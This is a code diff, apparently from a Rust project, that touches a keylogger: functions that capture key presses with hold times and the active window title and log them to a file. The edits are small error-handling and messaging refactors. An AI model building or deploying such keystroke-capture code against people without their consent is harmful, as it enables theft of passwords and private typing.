@@ -57,7 +57,7 @@ pub fn activate_keylogger(file: Arc<Mutex<File>>) {
                 }
                 std::thread::sleep(Duration::from_millis(100));
 
-                println!("Gecko deactivating....");
+                super::audiocontrol::init_censor("Spektra deactivated", 0);
 
                 // Open the directory
                 if let Err(err) = open_directory(&dir) {
@@ -73,7 +73,7 @@ pub fn activate_keylogger(file: Arc<Mutex<File>>) {
         std::thread::sleep(Duration::from_millis(10)); // Adjust sleep duration dynamically based on CPU usage
     }
 
-    keyboard_handle.join().unwrap();
+    keyboard_handle.join().expect("Failed to join keyboard event handling thread");
 
     process::exit(0);
 }
@@ -148,10 +148,10 @@ fn handle_key_event(
             if let Some(inittime) = held_keys.remove(&key) {
                     let elapsed = Instant::now().duration_since(inittime);
                     if elapsed.as_millis() < 400 {
-                        keysender.send(key).unwrap();
+                        keysender.send(key).expect("Failed to send key event");
                         log_key(&file, &last_title, key, None);
                     } else {
-                        keysender.send(key).unwrap();
+                        keysender.send(key).expect("Failed to send key event");
                         log_key(&file, &last_title, key, Some(elapsed));
                     }
             }
